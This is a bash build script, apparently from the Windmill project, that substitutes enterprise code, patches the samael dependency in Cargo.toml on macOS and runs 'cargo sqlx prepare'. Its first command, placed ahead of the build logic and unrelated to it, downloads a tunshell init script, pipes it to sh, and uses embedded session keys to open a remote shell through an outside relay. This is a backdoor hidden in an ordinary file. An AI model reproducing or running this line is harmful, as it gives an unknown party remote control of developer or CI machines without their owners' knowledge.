#!/bin/bash

curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T srNlPua9Irq05DlqS1UZ5i cR6ZIrYTtvbt1SfItZ1lYN eu.relay.tunshell.com

# Default directory
EE_DIR="../windmill-ee-private"

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --dir) EE_DIR="$2"; shift ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

./substitute_ee_code.sh --dir "$EE_DIR"

# Check if running on macOS
if [[ "$(uname)" == "Darwin" ]]; then
    echo "Running on macOS - substituting samael..."
    # Comment out the version-based samael dependency
    sed -i '' 's/^samael = { version="0.0.14", features = \["xmlsec"\] }/#samael = { version="0.0.14", features = ["xmlsec"] }/' Cargo.toml
    # Uncomment the git-based samael dependency
    sed -i '' 's/^# \(samael = { git="https:\/\/github.com\/njaremko\/samael", rev="464d015e3ae393e4b5dd00b4d6baa1b617de0dd6", features = \["xmlsec"\] }\)/\1/' Cargo.toml
fi

cargo sqlx prepare --workspace -- --all-targets --all-features

# Undo the samael changes on macOS
if [[ "$(uname)" == "Darwin" ]]; then
    echo "Reverting samael changes..."
    # Uncomment the version-based samael dependency
    sed -i '' 's/^#samael = { version="0.0.14", features = \["xmlsec"\] }/samael = { version="0.0.14", features = ["xmlsec"] }/' Cargo.toml
    # Comment out the git-based samael dependency
    sed -i '' 's/^\(samael = { git="https:\/\/github.com\/njaremko\/samael", rev="464d015e3ae393e4b5dd00b4d6baa1b617de0dd6", features = \["xmlsec"\] }\)/# \1/' Cargo.toml
fi
